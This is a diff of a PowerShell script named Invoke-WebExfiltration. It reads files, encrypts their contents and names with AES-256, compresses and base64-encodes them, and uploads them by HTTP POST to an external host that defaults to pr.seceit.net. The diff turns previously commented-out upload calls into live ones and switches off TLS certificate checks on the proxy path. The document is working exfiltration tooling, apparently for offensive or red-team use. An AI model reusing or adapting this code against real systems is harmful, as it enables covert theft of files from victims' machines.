@@ -1,5 +1,4 @@
 
-
 Function Invoke-WebExfiltration {
      <#
         .SYNOPSIS
@@ -56,9 +55,7 @@ Function Invoke-WebExfiltration {
         )]
         [string[]]$Target = 'https://pr.seceit.net',
         [string]$Password,
-        [string]$Proxy,
-        [switch]$unencrypted
-
+        [string]$Proxy
     )
 
     Begin {
@@ -89,7 +86,7 @@ Function Invoke-WebExfiltration {
         }
 
         Write-Debug "Plaintext password: '$Password'"
-        Write-Host "[-]"
+        # Write-Host "[~]"
     }
 
     Process {
@@ -104,8 +101,6 @@ Function Invoke-WebExfiltration {
         $file_name = [System.IO.Path]::GetFileName($file)
         $file_bin = [IO.File]::ReadAllBytes($file)
 
-
-         if ($true){
         Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"
 
          # AES encrypt
@@ -120,6 +115,9 @@ Function Invoke-WebExfiltration {
         $password_sha256 = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
         $aesManaged.Key = $password_sha256
 
+        $encryptor = $aesManaged.CreateEncryptor()
+        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
+        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted
 
         # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
         Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', ''))"
@@ -127,22 +125,15 @@ Function Invoke-WebExfiltration {
         # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
         Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', ''))"
         Write-Debug "AES IV length:  $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4) Bit ($([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8) Byte)"
+        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"
 
-        $encryptor = $aesManaged.CreateEncryptor()
-        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
-        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted
-
-        Write-Debug "IV+AES-256 Hex: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"
-        # Write-Debug "IV extracted: $($([System.BitConverter]::ToString($file_bin_encrypted[0..15]).Replace('-', '')))"
+        $file_name_utf8 = [System.Text.Encoding]::UTF8.GetBytes($file)
+        $file_name_encrypted = $encryptor.TransformFinalBlock($file_name_utf8, 0, $file_name_utf8.Length)
+        $file_name_encrypted = $aesManaged.IV + $file_name_encrypted
+        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', ''))"
 
         $aesManaged.Dispose()
-
         Write-Verbose "AES-256 encrypted '$file_name'"
-
-        }else {
-
-             $file_bin_encrypted = $file_bin
-         }
 
         # Gzip compress content
         # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
@@ -155,57 +146,70 @@ Function Invoke-WebExfiltration {
         Write-Verbose "Compressed '$file_name'"
 
         # convert to base64 string
-        $gzip_b64 = [Convert]::ToBase64String($ms.ToArray())
-        Write-Debug "Base64: $gzip_b64"
+        $b64_bin_gzip = [Convert]::ToBase64String($ms.ToArray())
+        $b64_filename = [Convert]::ToBase64String($file_name_encrypted)
+
+        Write-Debug "Base64 file name: $b64_filename"
+        Write-Debug "Base64 bin: $b64_bin_gzip"
         $ms.Close()
 
-        # $gzip_b64 | Out-File "$file.aes256.gzip.b64"
+        # Write encrypted base64 file to disk
+        # $b64_bin_gzip | Out-File "$file.aes256.gzip.b64"
 
         # ToDo: Add secrent as an HTTP header, like an API key so unrestricted people can't upload?
 
         $body = @{
-
-            "b64" = "$file_b64"
+            "fn" = "$b64_filename"
+            "ct" = "$b64_bin_gzip"
         }
 
         Write-Verbose "Uploading file '$file_name'"
         $uri = [uri]::EscapeUriString($target)
+        $rest_timeout = 5
+
+        # ToDo: implement prameter '-insecure' if certificate is not trusted (e.g. self signed)
 
         try {
             if ($Proxy){
                 $uriProxy = [uri]::EscapeUriString($Proxy)
 
-                # ToDo: implement prameter -insecure
-                # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-                # Invoke-RestMethod -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
+                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+                Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
+                Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"
+
             } else {
-                # Invoke-RestMethod -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
+                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -TimeoutSec $rest_timeout
+            }
+        }catch [System.Net.WebException] {
+            if($_.Exception.Status -eq 'Timeout'){
+                Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
+                break
+            }else {
+                Write-Host "[X] Error: An unexcepted System.Net.WebExpection occured. $($_.Exception.GetType().FullName)"
             }
         }
+        catch  [System.Net.Http.HttpRequestException] {
+            Write-Host "[X] Error: I think I could not connect to the server. Got this error: '$($_.Exception.Message)'"
+            break
+        }
+        catch {
+            Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
+            Write-Host "[X] Error: StatusCode:  $($_.Exception.Response.StatusCode.value__)"
+            Write-Host "[X] Error: StatusDescription:  $($_.Exception.Response.StatusDescription)"
+            Write-Host "[X] Error: I've no idea what's going on :("
+            break
+        }
 
-        catch
-        {
-            Write-Host "ERROR: StatusCode:" $_.Exception.Response.StatusCode.value__
-            Write-Host "ERROR: StatusDescription:" $_.Exception.Response.StatusDescription
-            Write-Host "ERROR: An error occurred (I've no idea what's going on)"
-            throw
+        if ($response.StatusCode -ne '200'){
+            Write-Host "[!] Error: Sending successfull but got resonse code '$($response.StatusCode)' from server. The file was probably not exfiltrated!"
+            Write-Host "[!] Error: Message from server: '$($response.Content)'"
         }
 
         Write-Verbose "Uploaded '$file_name'"
     }
 
      End {
-         Write-Host "[-]"
+         # Write-Host "[~]"
          Write-Host "[~] All done!"
      }
-}
-
-
-function AES-Encrypt {
-
-
-    # Copied from here https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
-
-
-
 }
